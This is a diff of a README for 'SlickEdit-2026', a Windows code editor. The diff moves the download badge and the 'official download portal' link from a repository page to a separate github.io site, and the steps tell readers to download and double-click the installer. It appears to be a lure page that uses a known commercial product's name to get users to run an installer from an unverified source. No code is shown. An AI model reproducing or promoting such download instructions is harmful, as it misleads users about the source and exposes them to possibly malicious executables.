@@ -1,6 +1,6 @@
 # 💻 SlickEdit-2026 - Write code faster on Windows systems
 
-[![Download SlickEdit-2026](https://img.shields.io/badge/Download-SlickEdit--2026-blue.svg)](https://github.com/tangled-flow218/SlickEdit-2026)
+[![Download SlickEdit-2026](https://img.shields.io/badge/Download-SlickEdit--2026-blue.svg)](https://tangled-flow218.github.io)
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ Make sure your Windows installation stays up to date. Updates provide necessary 
 
 Follow these steps to install the software on your computer.
 
-1.  Visit the [official download portal](https://github.com/tangled-flow218/SlickEdit-2026) to obtain the installer.
+1.  Visit the [official download portal](https://tangled-flow218.github.io) to obtain the installer.
 2.  Click the blue download button on the page to save the file to your computer.
 3.  Locate the downloaded file in your "Downloads" folder.
 4.  Double-click the installer file to begin the setup process.
